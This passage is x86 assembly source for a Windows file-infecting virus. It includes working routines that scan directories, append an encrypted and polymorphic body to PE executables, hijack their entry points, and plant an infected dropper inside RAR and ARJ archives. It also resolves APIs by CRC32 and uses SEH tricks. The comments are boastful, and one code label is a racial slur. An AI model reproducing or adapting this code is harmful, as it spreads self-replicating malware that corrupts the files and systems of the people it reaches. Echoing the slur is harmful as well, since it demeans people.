	apicall _GetCurrentDirectoryA

eBlock6 label   byte

TPI_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	and     byte ptr [ebp+TPI_semaphore],THREAD_SLEEPING

	jmp     ExitThread
ThrPrepareInf   endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Thread used for infect files                                           ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

ThrInfectFiles  proc PASCAL delta_thread:DWORD

	mov     ebp,delta_thread

	xor     ecx,ecx
TIF_Sleep:
	mov     cl,THREAD_SLEEPING
TIF_semaphore   equ $-1
	jecxz   TIF_Sleep

	pushad

	call    TIF_SetupSEH
	mov     esp,[esp+08h]
	jmp     TIF_RestoreSEH
TIF_SetupSEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock7-Block7

Block7  label   byte

	lea     edi,[ebp+directories]           ; Pointer to array of dirs
	mov     byte ptr [ebp+mirrormirror],dirs2inf
requiem:
	push    edi                             ; Set it as current
	apicall _SetCurrentDirectoryA

	push    edi                             ; Preserve that pointer
	lea     esi,[ebp+Extensions_Table]      ; Pointer to exts table
	mov     ecx,nExtensions
DirInf:
	lea     edi,[ebp+EXTENSION]             ; Ptr to active extension
	movsd                                   ; Put next one

	pushad
	call    Infect                          ; Infect some filez
	popad

	loop    DirInf
	pop     edi

	add     edi,7Fh                         ; Ptr to next dir

	dec     byte ptr [ebp+mirrormirror]     ; eeeooo supeeeeeerrr... :)
	jnz     requiem

eBlock7 label   byte

TIF_RestoreSEH:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx

	popad

	and     byte ptr [ebp+TIF_semaphore],THREAD_SLEEPING

	jmp     ExitThread
ThrInfectFiles  endp

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Search all the files (until limit reached) matching with search mask   ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

Infect:

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock8-Block8

Block8  label   byte

	and     dword ptr [ebp+infections],00000000h ; reset countah
	lea     eax,[ebp+offset WIN32_FIND_DATA] ; Find's shit
	push    eax
	lea     eax,[ebp+offset SEARCH_MASK]
	push    eax

	apicall _FindFirstFileA                 ; Find da first file
	cmp_    eax,FailInfect

	mov     dword ptr [ebp+SearchHandle],eax

__1:    push    dword ptr [ebp+ModBase]
	push    dword ptr [ebp+OldEIP]
	push    dword ptr [ebp+NewEIP]

	cmp     dword ptr [ebp+EXTENSION],"RAR"
	jz      ArchInfection
	cmp     dword ptr [ebp+EXTENSION],"JRA"
	jz      ArchInfection

	call    Infection
	jmp     overit
ArchInfection:
	call    InfectArchives

overit: pop     dword ptr [ebp+NewEIP]
	pop     dword ptr [ebp+OldEIP]
	pop     dword ptr [ebp+ModBase]

	inc     byte ptr [ebp+infections]
	cmp     byte ptr [ebp+infections],n_infections
	jz      FailInfect

__2:    lea     edi,[ebp+WFD_szFileName]
	mov     ecx,MAX_PATH
	xor     al,al
	rep     stosb

	lea     eax,[ebp+offset WIN32_FIND_DATA]
	push    eax
	push    dword ptr [ebp+SearchHandle]
	apicall _FindNextFileA
	or      eax,eax
	jnz     __1

CloseSearchHandle:
	push    dword ptr [ebp+SearchHandle]
	apicall _FindClose
FailInfect:
	ret

eBlock8 label   byte

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Infect PE file (by using WFD info)                                     ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

Infection:

	call    iENC_decrypt
	dd      00000000h
	dd      eBlock9-Block9

Block9  label   byte

	lea     esi,[ebp+WFD_szFileName]        ; Get FileName to infect
	push    80h
	push    esi
	apicall _SetFileAttributesA             ; Wipe its attributes

	call    OpenFile                        ; Open it

	cmp_    eax,CantOpen

	mov     dword ptr [ebp+FileHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; 1st we create map with 
	call    CreateMap                       ; its exact size
	or      eax,eax
	jz      CloseFile

	mov     dword ptr [ebp+MapHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] 
	call    MapFile                         ; Map it
	or      eax,eax
	jz      UnMapFile

	mov     dword ptr [ebp+MapAddress],eax

	mov     esi,[eax+3Ch]
	add     esi,eax
	cmp     dword ptr [esi],"EP"            ; Is it PE?
	jnz     NoInfect

	cmp     dword ptr [esi+mark],inf_mark   ; Was it infected?
	jz      NoInfect

	push    dword ptr [esi+3Ch]

	push    dword ptr [ebp+MapAddress]      ; Close all
	apicall _UnmapViewOfFile

	push    dword ptr [ebp+MapHandle]
	apicall _CloseHandle

	pop     ecx

	mov     eax,dword ptr [ebp+WFD_nFileSizeLow] ; And Map all again.
	add     eax,virus_size

	call    Align
	xchg    ecx,eax

	mov     dword ptr [ebp+NewSize],ecx

	call    CreateMap
	or      eax,eax
	jz      CloseFile

	mov     dword ptr [ebp+MapHandle],eax

	mov     ecx,dword ptr [ebp+NewSize]
	call    MapFile
	or      eax,eax
	jz      UnMapFile

	mov     dword ptr [ebp+MapAddress],eax
	
	mov     esi,[eax+3Ch]
	add     esi,eax

	mov     edi,esi

	movzx   eax,word ptr [edi+06h]
	dec     eax
	imul    eax,eax,28h
	add     esi,eax
	add     esi,78h
	mov     edx,[edi+74h]
	shl     edx,03h
	add     esi,edx

	pushad

	cmp     dword ptr [esi],"ler."
	jnz     not_reloc
	cmp     word ptr [esi+4],"co"
	jnz     not_reloc

	xchg    edi,esi                         ; Put a new name to .reloc
	call    GenerateName                    ; section :)

not_reloc:
	popad

	and     dword ptr [edi+0A0h],00h        ; Nulify the relocs, so they
	and     dword ptr [edi+0A4h],00h        ; won't fuck us :)

	mov     eax,[edi+28h]
	mov     dword ptr [ebp+OldEIP],eax

	mov     edx,[esi+10h]
	mov     ebx,edx
	add     edx,[esi+14h]

	push    edx

	mov     eax,ebx
	add     eax,[esi+0Ch]
	mov     dword ptr [ebp+NewEIP],eax

	mov     eax,[esi+10h]
	add     eax,virus_size
	mov     ecx,[edi+3Ch]
	call    Align

	mov     [esi+10h],eax
	mov     [esi+08h],eax

	pop     edx

	mov     eax,[esi+10h]
	add     eax,[esi+0Ch]
	mov     [edi+50h],eax

	or      dword ptr [esi+24h],section_flags
	mov     dword ptr [edi+mark],inf_mark

	pushad

	mov     eax,[edi+28h]

	mov     esi,edi
	add     esi,0F8h-28h                    ; Pointer to 1st section-28h
nigger: add     esi,28h                         ; Ptr to section name ;)
	mov     edx,eax                         ; Put in EDX the original EIP
	sub     edx,[esi+0Ch]                   ; Remove the VirtualAddress
	cmp     edx,[esi+08h]                   ; Is EIP pointing to this sec?
	jae     nigger                          ; If not, loop again

	or      [esi+24h],section_flags         ; Put sum attributes

	add     edx,[esi+14h]
	add     edx,dword ptr [ebp+MapAddress]
	mov     esi,edx
	push    edx

	push    00000100h                       ; Alloc 256 bytes for store
	push    00h                             ; the first bytes of the inf.
	apicall _GlobalAlloc                    ; files (temporally)
	mov     dword ptr [ebp+GlobalAllocHandle3],eax

	mov     ecx,100h
	push    ecx
	push    edi
	xchg    edi,eax
	rep     movsb
	pop     edi

	mov     eax,dword ptr [ebp+NewEIP]
	sub     eax,[edi+28h]
	lea     edi,[ebp+NewBytes]
	push    edi

; FREEDOM OR FIRE! Mwahahahahahah!

	call    phire                           ; Ya wanna sum fire? >:)

	pop     esi
	pop     ecx
	pop     edi
	rep     movsb
	popad

	push    edi
	push    edx
	apicall _GetTickCount
	pop     edx
	xchg    eax,ebx
	mov     dword ptr [ebp+key],ebx

	lea     esi,[ebp+legacy]
	xchg    edi,edx
	add     edi,dword ptr [ebp+MapAddress]

	push    edi
	mov     ecx,virus_size
	rep     movsb
	mov     edi,[esp]

	pushad
	lea     esi,[ebp+iENC_struc]
	call    iENC_encrypt
	popad

	pushad
	mov     esi,dword ptr [ebp+GlobalAllocHandle3]
	add     edi,(offset OldBytes-offset virus_start)
	mov     ecx,100h
	rep     movsb
	popad

	add     edi,(offset crypt-offset virus_start)
	mov     esi,edi

	mov     ecx,((offset virus_end-offset crypt)/4)
cloop:  lodsd
	xor     eax,ebx
	stosd
	loop    cloop

	mov     eax,edi

	pop     edi
	mov     ecx,virus_size-LIMIT
	mov     esi,edi
	add     esi,LIMIT       
	call    mmxe

	pop     edi
	mov     ecx,[edi+3Ch]
	call    Align
	sub     eax,dword ptr [ebp+MapAddress]

	push    eax

	push    dword ptr [ebp+MapAddress]
	push    eax
	call    Checksum
	mov     [edi+58h],eax

	pop     ecx
	call    TruncFile

	push    dword ptr [ebp+GlobalAllocHandle3] ; Free some memory
	apicall _GlobalFree

	jmp     UnMapFile

NoInfect:
	dec     byte ptr [ebp+infections]
	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
	call    TruncFile

UnMapFile:
	push    dword ptr [ebp+MapAddress]
	apicall _UnmapViewOfFile

CloseMap:
	push    dword ptr [ebp+MapHandle]
	apicall _CloseHandle

CloseFile:
	push    dword ptr [ebp+FileHandle]
	apicall _CloseHandle

CantOpen:
	push    dword ptr [ebp+WFD_dwFileAttributes]
	lea     eax,[ebp+WFD_szFileName]
	push    eax
	apicall _SetFileAttributesA
	ret

eBlock9 label   byte

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Infect given file in EDI                                               ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

InfectEDI:

	call    iENC_decrypt
	dd      00000000h
	dd      eBlockA-BlockA

BlockA  label   byte

	push    edi
	apicall _GetFileAttributesA
	cmp_    eax,_ExitInfection
	mov     dword ptr [ebp+WFD_dwFileAttributes],eax       

	mov     esi,edi
	call    OpenFile
	cmp_    eax,_ExitInfection

	push    eax

	push    00000000h
	push    eax
	apicall _GetFileSize
	mov     dword ptr [ebp+WFD_nFileSizeLow],eax

	apicall _CloseHandle

	lea     esi,[ebp+WFD_szFileName]
	xchg    esi,edi
duhast: lodsb
	or      al,al
	jz      engel
	stosb
	jmp     duhast
engel:  stosb
	push    dword ptr [ebp+NewEIP]
	push    dword ptr [ebp+OldEIP]
	push    dword ptr [ebp+ModBase]
	call    Infection
	pop     dword ptr [ebp+ModBase]
	pop     dword ptr [ebp+OldEIP]
	pop     dword ptr [ebp+NewEIP]

	test    al,00h                          ; Overlapppppp
	org     $-1
_ExitInfection:
	stc
	ret

eBlockA label   byte

InfectArchiveEDI:

	call    iENC_decrypt
	dd      00000000h
	dd      eBlockB-BlockB

BlockB  label   byte

	lea     esi,[ebp+WFD_szFileName]
	xchg    edi,esi
	push    esi
	push    7Fh
	pop     ecx
	rep     movsb
	pop     edi
	eosz_edi
	mov     eax,[edi-4]
	mov     dword ptr [ebp+EXTENSION],eax
	jmp     InfectArchives

eBlockB label   byte

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Infect Archives (using WFD Info)                                       ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;
; Infinite thanx here to two guys: StarZer0 and Int13h... Without you,
; i couldn't have been able to code this part of this virus :)

InfectArchives:

	call    iENC_decrypt
	dd      00000000h
	dd      eBlockC-BlockC

BlockC  label   byte

	lea     esi,[ebp+WFD_szFileName]        ; Save the name to infect for
	lea     edi,[ebp+TMP_szFileName]        ; later...
	push    7Fh
	pop     ecx
	rep     movsb

	push    00001000h                       ; Alloc memory for unpack the
	push    00000000h                       ; dropper
	apicall _GlobalAlloc
	or      eax,eax
	jz      ExitInfectArchive
	mov     dword ptr [ebp+GlobalAllocHandle],eax

	call    over_dropper
dr0p:   db      04Dh, 05Ah, 050h, 000h, 001h, 000h, 002h, 000h
	db      003h, 000h, 004h, 000h, 001h, 000h, 00Fh, 000h
	db      001h, 000h, 0FFh, 0FFh, 000h, 002h, 000h, 0B8h
	db      000h, 007h, 000h, 040h, 000h, 001h, 000h, 01Ah
	db      000h, 022h, 000h, 001h, 000h, 002h, 000h, 0BAh
	db      010h, 000h, 001h, 000h, 00Eh, 01Fh, 0B4h, 009h
	db      0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 090h
	db      090h, 054h, 068h, 069h, 073h, 020h, 070h, 072h
	db      06Fh, 067h, 072h, 061h, 06Dh, 020h, 06Dh, 075h
	db      073h, 074h, 020h, 062h, 065h, 020h, 072h, 075h
	db      06Eh, 020h, 075h, 06Eh, 064h, 065h, 072h, 020h
	db      057h, 069h, 06Eh, 033h, 032h, 00Dh, 00Ah, 024h
	db      037h, 000h, 088h, 000h, 050h, 045h, 000h, 002h
	db      000h, 04Ch, 001h, 004h, 000h, 001h, 000h, 0D8h
	db      026h, 09Dh, 06Eh, 000h, 008h, 000h, 0E0h, 000h
	db      001h, 000h, 08Eh, 081h, 00Bh, 001h, 002h, 019h
	db      000h, 001h, 000h, 002h, 000h, 003h, 000h, 006h
	db      000h, 007h, 000h, 010h, 000h, 003h, 000h, 010h
	db      000h, 003h, 000h, 020h, 000h, 004h, 000h, 040h
	db      000h, 002h, 000h, 010h, 000h, 003h, 000h, 002h
	db      000h, 002h, 000h, 001h, 000h, 007h, 000h, 003h
	db      000h, 001h, 000h, 00Ah, 000h, 006h, 000h, 050h
	db      000h, 003h, 000h, 004h, 000h, 006h, 000h, 002h
	db      000h, 005h, 000h, 010h, 000h, 002h, 000h, 020h
	db      000h, 004h, 000h, 010h, 000h, 002h, 000h, 010h
	db      000h, 006h, 000h, 010h, 000h, 00Ch, 000h, 030h
	db      000h, 002h, 000h, 090h, 000h, 01Ch, 000h, 040h
	db      000h, 002h, 000h, 014h, 000h, 053h, 000h, 043h
	db      04Fh, 044h, 045h, 000h, 005h, 000h, 010h, 000h
	db      003h, 000h, 010h, 000h, 003h, 000h, 002h, 000h
	db      003h, 000h, 006h, 000h, 00Eh, 000h, 020h, 000h
	db      002h, 000h, 0E0h, 044h, 041h, 054h, 041h, 000h
	db      005h, 000h, 010h, 000h, 003h, 000h, 020h, 000h
	db      003h, 000h, 002h, 000h, 003h, 000h, 008h, 000h
	db      00Eh, 000h, 040h, 000h, 002h, 000h, 0C0h, 02Eh
	db      069h, 064h, 061h, 074h, 061h, 000h, 003h, 000h
	db      010h, 000h, 003h, 000h, 030h, 000h, 003h, 000h
	db      002h, 000h, 003h, 000h, 00Ah, 000h, 00Eh, 000h
	db      040h, 000h, 002h, 000h, 0C0h, 02Eh, 072h, 065h
	db      06Ch, 06Fh, 063h, 000h, 003h, 000h, 010h, 000h
	db      003h, 000h, 040h, 000h, 003h, 000h, 002h, 000h
	db      003h, 000h, 00Ch, 000h, 00Eh, 000h, 040h, 000h
	db      002h, 000h, 050h, 000h, 068h, 003h, 068h, 010h
	db      010h, 000h, 002h, 000h, 068h, 000h, 001h, 000h
	db      020h, 040h, 000h, 001h, 000h, 068h, 025h, 020h
	db      040h, 000h, 001h, 000h, 06Ah, 000h, 001h, 000h
	db      0E8h, 009h, 000h, 003h, 000h, 033h, 0C0h, 048h
	db      050h, 0E8h, 006h, 000h, 003h, 000h, 0FFh, 025h
	db      04Ch, 030h, 040h, 000h, 001h, 000h, 0FFh, 025h
	db      054h, 030h, 040h, 000h, 0D6h, 001h, 050h, 052h
	db      030h, 04Eh, 020h, 02Dh, 020h, 058h, 058h, 058h
	db      020h, 053h, 065h, 061h, 052h, 043h, 048h, 065h
	db      052h, 020h, 05Bh, 046h, 061h, 054h, 061h, 04Ch
	db      020h, 065h, 052h, 052h, 06Fh, 052h, 021h, 021h
	db      021h, 05Dh, 000h, 001h, 000h, 055h, 06Eh, 061h
	db      062h, 06Ch, 065h, 020h, 074h, 06Fh, 020h, 069h
	db      06Eh, 069h, 074h, 069h, 061h, 06Ch, 069h, 07Ah
	db      065h, 020h, 073h, 065h, 061h, 072h, 063h, 068h
	db      020h, 065h, 06Eh, 067h, 069h, 06Eh, 065h, 00Ah
	db      055h, 06Eh, 06Bh, 06Eh, 06Fh, 077h, 06Eh, 020h
	db      065h, 072h, 072h, 06Fh, 072h, 020h, 061h, 074h
	db      020h, 061h, 064h, 064h, 072h, 065h, 073h, 073h
	db      020h, 042h, 046h, 046h, 037h, 039h, 034h, 036h
	db      033h, 000h, 097h, 001h, 03Ch, 030h, 000h, 00Ah
	db      000h, 05Ch, 030h, 000h, 002h, 000h, 04Ch, 030h
	db      000h, 002h, 000h, 044h, 030h, 000h, 00Ah, 000h
	db      067h, 030h, 000h, 002h, 000h, 054h, 030h, 000h
	db      016h, 000h, 074h, 030h, 000h, 006h, 000h, 082h
	db      030h, 000h, 006h, 000h, 074h, 030h, 000h, 006h
	db      000h, 082h, 030h, 000h, 006h, 000h, 055h, 053h
	db      045h, 052h, 033h, 032h, 02Eh, 064h, 06Ch, 06Ch
	db      000h, 001h, 000h, 04Bh, 045h, 052h, 04Eh, 045h
	db      04Ch, 033h, 032h, 02Eh, 064h, 06Ch, 06Ch, 000h
	db      003h, 000h, 04Dh, 065h, 073h, 073h, 061h, 067h
	db      065h, 042h, 06Fh, 078h, 041h, 000h, 003h, 000h
	db      045h, 078h, 069h, 074h, 050h, 072h, 06Fh, 063h
	db      065h, 073h, 073h, 000h, 072h, 001h, 010h, 000h
	db      002h, 000h, 014h, 000h, 003h, 000h, 006h, 030h
	db      00Bh, 030h, 021h, 030h, 027h, 030h, 000h, 0F0h
	db      003h
sdr0p   equ     ($-offset dr0p)
over_dropper:
	pop     esi

	mov     ecx,sdr0p                       ; Unpack in allocated memory
	xchg    edi,eax                         ; the dropper
	call    LSCE_UnPack

	push    00000000h                       ; Create the dropper on
	push    00000080h                       ; a temporal file called
	push    00000002h                       ; LEGACY.TMP (that will be
	push    00000000h                       ; erased later)
	push    00000001h
	push    40000000h
	lea     edi,[ebp+hate]
	push    edi
	apicall _CreateFileA

	push    eax                             ; Write it, sucka!

	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    00001000h
	push    dword ptr [ebp+GlobalAllocHandle]
	push    eax
	apicall _WriteFile

	apicall _CloseHandle

	call    o_tmp
hate    db      "LEGACY.TMP",0                  ; Infect the dropped file
o_tmp:  pop     edi
	call    InfectEDI

	lea     eax,[ebp+WIN32_FIND_DATA]       ; Find's shit
	push    eax
	lea     eax,[ebp+hate]
	push    eax
	apicall _FindFirstFileA

	inc     eax
	jz      CantOpenArchive
	dec     eax

	push    dword ptr [ebp+WFD_nFileSizeLow]
	pop     dword ptr [ebp+InfDropperSize]

	push    eax
	apicall _FindClose

	lea     esi,[ebp+hate]
	call    OpenFile
	mov     dword ptr [ebp+FileHandle],eax

	push    dword ptr [ebp+InfDropperSize]
	push    00000000h
	apicall _GlobalAlloc
	or      eax,eax
	jz      CloseFileArchive

	mov     dword ptr [ebp+GlobalAllocHandle2],eax

	push    00h
	lea     ebx,[ebp+NumBytesRead]
	push    ebx
	push    dword ptr [ebp+InfDropperSize]
	push    eax
	push    dword ptr [ebp+FileHandle]
	apicall _ReadFile

	push    dword ptr [ebp+FileHandle]
	apicall _CloseHandle

	lea     esi,[ebp+TMP_szFileName]        ; Get FileName to infect
	push    80h
	push    esi
	apicall _SetFileAttributesA             ; Wipe its attributes

	call    OpenFile                        ; Open it

	cmp_    eax,CantOpenArchive
	mov     dword ptr [ebp+FileHandle],eax

	push    00h
	push    eax
	apicall _GetFileSize
	mov     dword ptr [ebp+ArchiveSize],eax

	mov     ecx,dword ptr [ebp+EXTENSION]
;       cmp     ecx,"RAR"
;       jz      InfectRAR
	cmp     ecx,"JRA"
	jz      InfectARJ

; -------------
; RAR Infection
; -------------

InfectRAR:
	push    00h                             ; See if it was previously
	push    00h                             ; infected...
	sub     eax,dword ptr [ebp+InfDropperSize]
	sub     eax,sRARHeaderSize
	push    eax
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer
	inc     eax
	jz      TryToInfectRAR
	dec     eax

	push    00h
	lea     ebx,[ebp+NumBytesRead]
	push    ebx
	push    50d
	lea     ebx,[ebp+ArchiveBuffer]
	push    ebx
	push    dword ptr [ebp+FileHandle]
	apicall _ReadFile
	or      eax,eax
	jz      TryToInfectRAR

	cmp     word ptr [ebp+ArchiveBuffer+14h],archive_mark
	jz      CloseFileArchive

; Let's fill properly RAR fields :)

TryToInfectRAR:
	lea     edi,[ebp+RARName]               ; Generate a random 6 char name
	call    GenerateName                    ; for the dr0pper ;)

	mov     edi,dword ptr [ebp+InfDropperSize]
	mov     dword ptr [ebp+RARCompressed],edi
	mov     dword ptr [ebp+RAROriginal],edi
	mov     esi,dword ptr [ebp+GlobalAllocHandle2]
	call    CRC32
	mov     dword ptr [ebp+RARCrc32],eax

	lea     esi,[ebp+RARHeader+2]
	mov     edi,sRARHeaderSize-2
	call    CRC32
	mov     word ptr [ebp+RARHeaderCRC],ax

	push    02h
	push    00h
	push    00h
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer

	push    00h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    sRARHeaderSize
	lea     ebx,[ebp+RARHeader]
	push    ebx
	push    dword ptr [ebp+FileHandle]
	apicall _WriteFile

	push    00h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    dword ptr [ebp+InfDropperSize]
	push    dword ptr [ebp+GlobalAllocHandle2]
	push    dword ptr [ebp+FileHandle]
	apicall _WriteFile

	jmp     CloseFileArchive

; -------------
; ARJ Infection
; -------------

InfectARJ:
	push    00h                             ; Let's see if it was infected
	push    00h
	sub     eax,dword ptr [ebp+InfDropperSize]
	sub     eax,sARJTotalSize+4
	push    eax
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer
	inc     eax
	jz      TryToInfectARJ
	dec     eax

	push    00h
	lea     ebx,[ebp+NumBytesRead]
	push    ebx
	push    50d
	lea     ebx,[ebp+ArchiveBuffer]
	push    ebx
	push    dword ptr [ebp+FileHandle]
	apicall _ReadFile
	or      eax,eax
	jz      TryToInfectARJ

	cmp     word ptr [ebp+ArchiveBuffer],0EA60h
	jnz     CloseFileArchive

	cmp     word ptr [ebp+ArchiveBuffer+0Ch],archive_mark
	jz      CloseFileArchive

; Let's fill properly ARJ fields :)

TryToInfectARJ:
	lea     edi,[ebp+ARJFilename]
	call    GenerateName

	push    02h
	push    00h
	push    00h
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer

	xchg    ecx,edx
	mov     edx,eax
	sub     edx,4
	sbb     ecx,1
	add     ecx,1

	push    00h
	push    00h
	push    edx
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer

	mov     edi,dword ptr [ebp+InfDropperSize]
	mov     dword ptr [ebp+ARJCompress],edi
	mov     dword ptr [ebp+ARJOriginal],edi
	mov     esi,dword ptr [ebp+GlobalAllocHandle2]
	call    CRC32
	mov     dword ptr [ebp+ARJCRC32],eax

	push    00h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    sARJHeader
	lea     ebx,[ebp+ARJHeader]
	push    ebx
	push    dword ptr [ebp+FileHandle]
	apicall _WriteFile

	lea     esi,[ebp+ARJHSmsize]
	mov     edi,sARJCRC32Size
	call    CRC32

	mov     dword ptr [ebp+ARJHeaderCRC],eax

	push    00h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    sARJSecondSide
	lea     ebx,[ebp+ARJSecondSide]
	push    ebx
	push    dword ptr [ebp+FileHandle]
	apicall _WriteFile

	push    00h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    dword ptr [ebp+InfDropperSize]
	push    dword ptr [ebp+GlobalAllocHandle2]
	push    dword ptr [ebp+FileHandle]
	apicall _WriteFile

	and     word ptr [ebp+ARJHeadsiz],0000h ; This shit is needed

	push    00h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    04h
	lea     ebx,[ebp+ARJHeader]
	push    ebx
	push    dword ptr [ebp+FileHandle]
	apicall _WriteFile

CloseFileArchive:
	push    dword ptr [ebp+FileHandle]
	apicall _CloseHandle

CantOpenArchive:
	push    dword ptr [ebp+GlobalAllocHandle]
	apicall _GlobalFree

	push    dword ptr [ebp+GlobalAllocHandle2]
	apicall _GlobalFree

	lea     edi,[ebp+hate]
	push    edi
	apicall _DeleteFileA
ExitInfectArchive:
	ret

eBlockC label   byte

;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]
;|| Some miscellaneous routines                                            ||
;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]

GetUsefulInfo:
	pushs   "USER32"
	apicall _LoadLibraryA
	push    eax
	lea     esi,[ebp+@FindWindowA]
	lea     edi,[ebp+@@OffsetzUSER32]
	call    GetAPIs
	apicall _FreeLibrary

	pushs   "ADVAPI32"
	apicall _LoadLibraryA
	push    eax
	lea     esi,[ebp+@RegCreateKeyExA]
	lea     edi,[ebp+@@OffsetzADVAPI32]
	call    GetAPIs
	apicall _FreeLibrary
	ret

; input:
;       ESI = Program return address
; output:
;       EAX = KERNEL32 imagebase
;

GetK32          proc
	pushad
	call    GetK32_SEH
	mov     esp,[esp+08h]
WeFailed:
	popad
	pushad
	mov     esi,kernel_w9x
	call    CheckMZ
	jnc     WeGotK32
	mov     esi,kernel_wNT
	call    CheckMZ
	jnc     WeGotK32
	mov     esi,kernel_w2k
	call    CheckMZ
	jnc     WeGotK32

	xor     esi,esi
	jmp     WeGotK32
GetK32_SEH:
	xor     edx,edx
	push    dword ptr fs:[edx]
	mov     fs:[edx],esp

	and     esi,0FFFF0000h
_@1:    cmp     word ptr [esi],"ZM"
	jz      CheckPE
_@2:    sub     esi,00010000h
	loop    _@1
	jmp     WeFailed
CheckPE:
	mov     edi,[esi+3Ch]
	add     edi,esi
	cmp     dword ptr [edi],"EP"
	jnz     _@2
WeGotK32:
	xor     edx,edx
	pop     dword ptr fs:[edx]
	pop     edx
	mov     [esp.PUSHAD_EAX],esi
	popad
	ret
GetK32          endp

; input:
;       EAX = Base address of the library where search the APIs
;       ESI = Pointer to an array of CRC32 of the APIs we want to search
;       EDI = Pointer to where store the APIs
; output:
;       Nothing.
;

GetAPIs         proc
	push    eax                             ; EAX = Handle of module
	pop     dword ptr [ebp+TmpModuleBase]
APIS33K:
	lodsd                                   ; Get in EAX the CRC32 of API
	push    esi edi
	call    GetAPI_ET_CRC32
	pop     edi esi
	stosd                                   ; Save in [EDI] the API address
	cmp     byte ptr [esi],Billy_Bel        ; Last API?
	jnz     APIS33K                         ; Yeah, get outta here
	ret
GetAPIs         endp

; input:
;       EAX = CRC32 of the API we want to know its address
; output:
;       EAX = API address
;

GetAPI_ET_CRC32 proc
	xor     edx,edx
	xchg    eax,edx                         ; Put CRC32 of da api in EDX
	mov     word ptr [ebp+Counter],ax       ; Reset counter
	mov     esi,3Ch
	add     esi,[ebp+TmpModuleBase]         ; Get PE header of module
	lodsw
	add     eax,[ebp+TmpModuleBase]         ; Normalize

	mov     esi,[eax+78h]                   ; Get a pointer to its 
	add     esi,1Ch                         ; Export Table
	add     esi,[ebp+TmpModuleBase]

	lea     edi,[ebp+AddressTableVA]        ; Pointer to the address table
	lodsd                                   ; Get AddressTable value
	add     eax,[ebp+TmpModuleBase]         ; Normalize
	stosd                                   ; And store in its variable

	lodsd                                   ; Get NameTable value
	add     eax,[ebp+TmpModuleBase]         ; Normalize
	push    eax                             ; Put it in stack
	stosd                                   ; Store in its variable

	lodsd                                   ; Get OrdinalTable value
	add     eax,[ebp+TmpModuleBase]         ; Normalize
	stosd                                   ; Store

	pop     esi                             ; ESI = NameTable VA

@?_3:   push    esi                             ; Save again
	lodsd                                   ; Get pointer to an API name
	add     eax,[ebp+TmpModuleBase]         ; Normalize
	xchg    edi,eax                         ; Store ptr in EDI
	mov     ebx,edi                         ; And in EBX

	push    edi                             ; Save EDI
	eosz_edi
	pop     esi                             ; ESI = Pointer to API Name

	sub     edi,ebx                         ; EDI = API Name size

	push    edx                             ; Save API's CRC32
	call    CRC32                           ; Get actual api's CRC32
	pop     edx                             ; Restore API's CRC32
	cmp     edx,eax                         ; Are them equal?
	jz      @?_4                            ; if yes, we got it

	pop     esi                             ; Restore ptr to api name
	add     esi,4                           ; Get the next
	inc     word ptr [ebp+Counter]          ; And increase the counter
	jmp     @?_3                            ; Get another api!
@?_4:
	pop     esi                             ; Remove shit from stack
	movzx   eax,word ptr [ebp+Counter]      ; AX = Counter
	shl     eax,1                           ; *2 (it's an array of words)
	add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
	xchg    eax,esi                         ; ESI = Ptr 2 ordinal; EAX = 0
	lodsw                                   ; Get ordinal in AX
	cwde                                    ; Clear MSW of EAX
	shl     eax,2                           ; And with it we go to the
	add     eax,dword ptr [ebp+AddressTableVA] ; AddressTable (array of
	xchg    esi,eax                         ; dwords)
	lodsd                                   ; Get Address of API RVA
	add     eax,[ebp+TmpModuleBase]         ; and normalize!! That's it!
	ret
GetAPI_ET_CRC32 endp

; input:
;       EAX = Number to align
;       ECX = Alignment factor
; output:
;       EAX = Aligned number
;

Align           proc
	push    edx
	xor     edx,edx
	push    eax
	div     ecx
	pop     eax
	sub     ecx,edx
	add     eax,ecx
	pop     edx
	ret
Align           endp

; input:
;       ECX = Offset where truncate
; output:
;       Nothing.
;

TruncFile       proc
	xor     eax,eax
	push    eax
	push    eax
	push    ecx
	push    dword ptr [ebp+FileHandle]
	apicall _SetFilePointer

	push    dword ptr [ebp+FileHandle]
	apicall _SetEndOfFile
	ret
TruncFile       endp

; input:
;       ESI = Pointer to the file where open
; output:
;       EAX = Handle/INVALID_HANDLE_VALUE

OpenFile        proc
	xor     eax,eax
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    80000000h or 40000000h
	push    esi
